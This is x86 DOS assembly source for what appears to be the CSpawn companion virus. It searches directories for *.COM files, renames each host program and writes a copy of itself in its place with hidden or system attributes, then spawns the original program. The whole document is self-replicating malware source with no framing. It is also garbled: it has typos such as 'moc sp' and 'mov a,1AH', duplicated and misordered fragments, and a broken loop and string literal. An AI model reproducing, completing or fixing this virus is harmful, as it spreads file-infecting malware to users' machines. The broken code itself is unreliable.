mov sp,OFFSET FINISH + 100H
mov ah,4AH
mov bx,(OFFSET FINISH )/16 +11H
mov dx,OFFSET SPAWN_NAME
mov bx,OFFSET PARAM_BLK
mov ax,4B00H
int 21H
mov dx,OFFSET COM_MASK
mov ah,4EH
xor cx,cx
SLOOP: int 21H
    jc SDONE
    call INFECT_FILE
    mov ah,4FH
    jmp SLOOP
SDONE:
    mov a,1AH
    mov dx,80H
    int 21H
DTA DB 43 dup(?)

mov ah,1AH
mov dx,OFFSET DTA

int 21H

mov dx,9EH
mov di,OFFSET SPAWN_NAME

mov ah,56H
int 21H
mov ah,3CH
mov cx,3
mov dx,9EH
int 21H

mov ah,40H 
mov cx,FINISH-CSpawn
mov dx,100H
int 21H

mov bx,OFFSET PARAM_BLK
mov ax,4B00H
int 21H

cli
mov bx,ax
mov ax,cs 
mov ss,ax
moc sp,(FINISH-CSpawn)+200H
sti
push bx
mov ds,ax
moc es,ax
mov ah,1AH
mov dx,80H
int 21H
call FIND_FILES
pop ax
mov ah,4CH
int 21H

FIND_FILES:
    mov dx,OFFSET COM_MASK
    mov ah,4EH
    xor cx,cx
FIND_LOOP: int 21H
    jc FIND_DONE
    call INFECT_FILE
    mov ah,4FH
    jmp FIND_LOOP

FIND_DONE: ret
COM_MASK db '*.COM',0

INFECT_FILE:
    mov si,9EH
    mov di,OFFSET REAL_NAME
INF_LOOP:
    lodsb
    stosb
    or al,al
    jnz INFECT_FILE
    mov WORD PTR [di-2],'N
    mov dx,9EH
    mov di,OFFSET REAL_NAME
    mov ah,56H
    int 21H
    jc INF_EXIT

    mov ah,3CH
    mov cx,2
    int 21H

    mov bx,ax
    mov ah,40H 
    mov cx,FIND_DONE -  CSpawn\
    mov dx,OFFSET CSpawn
    int 21H

INF_EXIT: ret

REAL_NAME db 13 dup (?)

PARAM_BLK DW ?
    DD 80H
    DD 5CH
    DD 6CH

FINISH:
    end CSpawn

